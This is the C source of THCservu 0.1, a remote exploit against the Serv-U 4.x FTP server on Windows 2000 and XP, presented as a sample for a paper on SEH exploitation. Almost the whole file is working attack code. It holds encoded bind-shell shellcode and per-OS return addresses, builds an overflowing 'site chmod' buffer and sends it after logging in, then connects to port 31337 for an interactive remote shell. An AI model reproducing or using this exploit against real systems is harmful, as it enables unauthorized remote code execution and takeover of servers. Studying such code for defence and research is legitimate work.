/*****************************************************************************/
/* THCservu 0.1 - Wind0wZ remote root exploit                                */
/* Exploit by: Johnny Cyberpunk (jcyberpunk@thc.org)                         */
/* THC PUBLIC SOURCE MATERIALS                                               */
/*                                                                           */
/* Credits go to kkqq@0x557.org who found that bug.                          */
/* his Advisory: http://www.0x557.org/release/servu.txt                      */
/*                                                                           */
/* compile with MS Visual C++ : cl THCservu.c                                */
/*                                                                           */
/* At least some greetz fly to : THC, Halvar Flake, FX, gera, MaXX, dvorak,  */
/* scut, stealth, FtR and Random                                             */
/*****************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

char *WIN2KEN   = "\xc4\x2a\x02\x75";
char *WIN2KPG   = "\xc4\x2a\xf9\x74";
char *WINXPSP1G = "\xfe\x63\xa1\x71";

#define jumper    "\xeb\x06\x4a\x43"

char shellcode[] =
"\x8b\x7c\x24\xfc\x83\xc7\x21\x33\xc9\xb2\x8f\x66\x81\xc1\x02"
"\x02\x8a\x1f\x32\xda\x88\x1f\x47\xe2\xf7\x64\xac\xf5\xe6\x8d"
"\x8a\xe3\xd6\x77\x92\x13\x51\x03\x5e\xc3\xff\x5b\x8c\x7f\xa8"
"\xaf\xaf\xbf\x87\xd8\xdc\xbd\xd0\xbc\xbd\xa1\xcb\xc3\xc3\x8e"
"\x64\x8a\x67\x76\x70\x70\x70\xd2\x0c\x62\xa5\xe5\xbf\xd6\xeb"
"\x04\x8e\x04\xcf\x83\x04\xff\x93\x22\x04\xf7\x87\x02\xd0\xb3"
"\x04\x94\x8e\x74\x04\xd4\xf7\x8e\x74\x04\xc4\x93\x8e\x76\x04"
"\xdc\xab\x8e\x75\xdc\xde\xdd\x04\xd4\xaf\x8e\x74\xbe\x46\xce"
"\xbe\x4f\x16\x04\xbb\x04\x8e\x71\x23\xbe\x4d\x5e\x6d\x0b\x4f"
"\xfa\x78\x80\x39\xca\x8a\x02\xcb\xca\x8b\xe9\xb6\x9f\xfa\x6e"
"\xe9\xbe\x9f\xd5\xd7\xd1\xd9\xdf\xdd\xa4\xc1\x9f\xce\x80\x38"
"\x83\xc5\x04\x8b\x07\x8e\x77\x80\x39\xc2\x8a\x06\xcb\x02\x57"
"\x71\xc2\x8a\xfa\x31\x71\xc2\x8b\xfb\xae\x71\xc2\xad\x02\xd2"
"\x97\xdc\x70\x5f\x06\x48\xe5\x8b\xd7\x07\xca\x8a\x0f\xca\xf8"
"\x85\x02\xd2\xfb\x0f\xe4\xa9\x9b\x66\xf7\x70\x70\x70\x06\x41"
"\xbe\x54\xdc\xdc\xdc\xdc\xd9\xc9\xd9\x70\x5f\x18\xda\xd7\xe9"
"\x06\xbf\xe5\x9f\xda\xd8\x70\xda\x5b\xc1\xd9\xd8\x70\xda\x43"
"\xdc\xda\xd8\x70\xda\x5f\x18\x02\xca\x07\xdf\x70\xda\x6b\xda"
"\xda\x70\xda\x67\x02\xcb\x8a\x83\x1b\xdc\xe7\xa1\xea\xf7\xea"
"\xe7\xd3\xec\xe2\xeb\x1b\xbe\x5d\x02\xca\x43\x1b\xd8\xd8\xd8"
"\xdc\xdc\x71\x49\x8e\x7d\xdd\x1b\x02\xca\xf7\xdf\x02\xca\x07"
"\xdf\x3e\x87\xdc\xdc\xe5\x9f\x71\x41\xdd\xdc\xdc\xdc\xda\x70"
"\xda\x63\xe5\x70\x70\xda\x6f";


void usage();
void shell(int sock);

int main(int argc, char *argv[])
{  
  unsigned short servuport;
  unsigned int i,sock,sock2,addr,os,rc,rc2,dirlen,craplen=400;
  unsigned char *user,*pass,*chmod,*recvbuf,*finalbuffer,*crapbuf,*directory;
  unsigned char *temp;
  struct sockaddr_in mytcp;
  struct hostent * hp;
  WSADATA wsaData;

  printf("\nTHCservu v0.1 - Servu 4.x sample exploit for the paper\n");
  printf("Practical SEH exploitation - by Johnny Cyberpunk (jcyberpunk@thc.org)\n");

  if(argc<7 || argc>7)
   usage();

  user = malloc(256);
  memset(user,0,256);

  pass = malloc(256);
  memset(pass,0,256);
  
  chmod = malloc(128);
  memset(chmod,0,128);

  directory = malloc(256);
  memset(directory,0,256);

  crapbuf = malloc(512);
  memset(crapbuf,0,512);

  recvbuf = malloc(256);
  memset(recvbuf,0,256);

  finalbuffer = malloc(1000);
  memset(finalbuffer,0,1000);

  printf("\n[*] building buffer\n");

  sprintf(user,"user %s\r\n",argv[3]);
  sprintf(pass,"pass %s\r\n",argv[4]);
  strcpy(chmod,"site chmod 666 ");

  temp=malloc(256);
  memset(temp,0,256);
  
  dirlen=strlen(argv[5]);
  temp=argv[5];
  *temp++;
  if((strncmp(":\\",temp,2))!=0)
  {
   printf("\nGimme valid path name, ie. c:\\upload\n");
   exit(-1);
  }
  
  dirlen-=2;

  if(dirlen!=1)      
   craplen=craplen-dirlen;

  for(i=0;i<craplen;i++)
   crapbuf[i]='X';

  strcat(finalbuffer,chmod);
  strcat(finalbuffer,crapbuf);
  strcat(finalbuffer,jumper);

  os = (unsigned short)atoi(argv[6]);  
  switch(os)
  {
   case 0:
    strcat(finalbuffer,WIN2KEN);
    break;
   case 1:
    strcat(finalbuffer,WIN2KPG);
    break;
   case 2:
    strcat(finalbuffer,WINXPSP1G);
    break;
   default:
    printf("\nYou entered an illegal target !\n\n");
    usage();
    exit(-1);
  }

  strcat(finalbuffer,shellcode);
  strcat(finalbuffer,"\r\n");
      
  if (WSAStartup(MAKEWORD(2,1),&wsaData) != 0)
  {
   printf("WSAStartup failed !\n");
   exit(-1);
  }
  
  hp = gethostbyname(argv[1]);

  if (!hp){
   addr = inet_addr(argv[1]);
  }
  if ((!hp)  && (addr == INADDR_NONE) )
  {
   printf("Unable to resolve %s\n",argv[1]);
   exit(-1);
  }

  sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
  if (!sock)
  { 
   printf("socket() error...\n");
   exit(-1);
  }
  
  if (hp != NULL)
   memcpy(&(mytcp.sin_addr),hp->h_addr,hp->h_length);
  else
   mytcp.sin_addr.s_addr = addr;

  if (hp)
   mytcp.sin_family = hp->h_addrtype;
  else
   mytcp.sin_family = AF_INET;

  servuport=atoi(argv[2]);
  mytcp.sin_port=htons(servuport);

  printf("[*] connecting the target\n");

  rc=connect(sock, (struct sockaddr *) &mytcp, sizeof (struct sockaddr_in));
  if(rc==0)
  {
     rc2=recv(sock,recvbuf,256,0);
     printf("[*] sending username\n");
     send(sock,user,256,0);
     rc2=recv(sock,recvbuf,256,0);
     printf("[*] sending password\n");
     send(sock,pass,256,0);
     rc2=recv(sock,recvbuf,256,0);
     if(rc2<0)
     {
      printf("\nError while recv() data!\n");
      exit(-1);
     }
     else if (memcmp(recvbuf,"530 ",4) == 0)
     {
      printf("\nWrong user/pass !\n");
      exit(-1);
     }
     else
     {
      _snprintf(directory,127,"cwd %s\r\n",argv[5]);
      send(sock,directory,256,0);
      rc2=recv(sock,recvbuf,256,0);
      if (memcmp(strupr(recvbuf),"550 ",4) == 0)
      {
       printf("\nError changing to path %s\n",argv[5]);
       exit(-1);
      }
      send(sock,finalbuffer,2000,0);
      printf("[*] Exploit send successfully ! Sleeping a while ....\n");
      Sleep(1000);
     }
  }
  else
   printf("\nCan't connect to ftp port!\n");
   
  if(rc==0)
  {
   printf("[*] Trying to get a shell\n\n");
   sock2 = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
   mytcp.sin_port = htons(31337);
   rc = connect(sock2, (struct sockaddr *)&mytcp, sizeof(mytcp));
   if(rc!=0)
   {
    rc2=recv(sock,recvbuf,256,0);
    if (memcmp (recvbuf, "550 ", 4) == 0)
    {
     printf("\nYou don't have permissions to upload!\n");
     exit(-1);
    }
    else  	
    {   	
     printf("can't connect to port 31337 ;( maybe firewalled ...\n");
     exit(-1);
    }
   }
   shell(sock2);
  }

  shutdown(sock,1);
  closesocket(sock);

  free(user);
  free(pass);
  free(chmod);
  free(directory);
  free(crapbuf);
  free(finalbuffer);  
  free(recvbuf);

  exit(0);
}
 
void usage()
{
 unsigned int a;
 printf("\nUsage:  <Host> <Port> <Username> <Password> <Directory> <Target>\n");
 printf("Sample: THCservu 194.44.55.56 21 lamer test123 c:\\ 0\n");
 printf("Targets:\n");
 printf("0 - Windows 2000 Server english all service packs\n");
 printf("1 - Windows 2000 Professional german\n");
 printf("2 - Windows XP SP1 german\n");
 exit(0);
}

void shell(int sock)
{
 int l;
 char buf[1024];
 struct timeval time;
 unsigned long ul[2];

 time.tv_sec = 1;
 time.tv_usec = 0;

 while (1)
 {
  ul[0] = 1;
  ul[1] = sock;

  l = select (0, (fd_set *)&ul, NULL, NULL, &time);
  if(l == 1)
  {  	
   l = recv (sock, buf, sizeof (buf), 0);
   if (l <= 0)
   {
    printf ("bye bye...\n");
    return;
   }
  l = write (1, buf, l);
   if (l <= 0)
   {
    printf ("bye bye...\n");
    return;
   }
  }
  else
  {
   l = read (0, buf, sizeof (buf));
   if (l <= 0)
   {
    printf("bye bye...\n");
    return;
   }
   l = send(sock, buf, l, 0);
   if (l <= 0)
   {
    printf("bye bye...\n");
    return;
   }
  }
 }
}

